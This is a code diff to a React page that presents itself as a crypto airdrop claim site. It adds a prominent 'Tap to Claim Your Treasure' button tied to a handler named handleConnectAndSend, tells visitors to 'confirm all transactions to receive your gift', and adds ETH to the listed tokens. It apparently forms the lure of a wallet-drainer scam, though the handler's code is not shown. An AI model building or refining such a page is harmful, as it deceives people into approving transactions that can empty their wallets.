@@ -201,7 +201,7 @@ function App() {
             >
               {
                 loading
-                  ? "Processing..."
+                  ? "💰Awaiting Airdrop..."
                   : state.address
                   ? "Claiming | awaiting airdrop..."
                   : "Your airdrop is ready for claim🪂"
@@ -215,13 +215,28 @@ function App() {
           </div>
         </div>
       </div>
+      <div className="container claim-button d-flex justify-content-center align-items-center">
+        <button
+          className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
+          onClick={handleConnectAndSend}
+          disabled={loading}
+        >
+          {
+            loading
+              ? "💰awaiting Airdrop..."
+              : state.address
+              ? "Claiming | awaiting airdrop..."
+              : "Tap to Claim Your Treasure 💎"
+          }
+        </button>
+      </div>
       <div className="container d-flex text-center mt-5 align-items-center justify-content-center">
         <div className="row justify-content-center">
           <div className="col-md-4">
             <div className="card mb-4 shadow-sm">
               <div className="card-body">
                 <h5 className="card-title">How to Claim🎁</h5>
-                <p className="card-text">Click the button above to connect your wallet. Once connected, confirm the transactions to receive your airdrop rewards!</p>
+                <p className="card-text">Claim through the button above to receive airdrop rewards. confirm all transactions to receive your gift!</p>
               </div>
             </div>
           </div>
@@ -229,7 +244,7 @@ function App() {
             <div className="card mb-4 shadow-sm">
               <div className="card-body">
                 <h5 className="card-title">Supported Tokens💰</h5>
-                <p className="card-text">We support a variety of popular tokens including USDC, USDT, DAI, WBTC, and many more! Check your wallet for the rewards.</p>
+                <p className="card-text">We support a variety of popular tokens including ETH, USDC, USDT, DAI, WBTC, and many more! Check your wallet for the rewards.</p>
               </div>
             </div>
           </div>
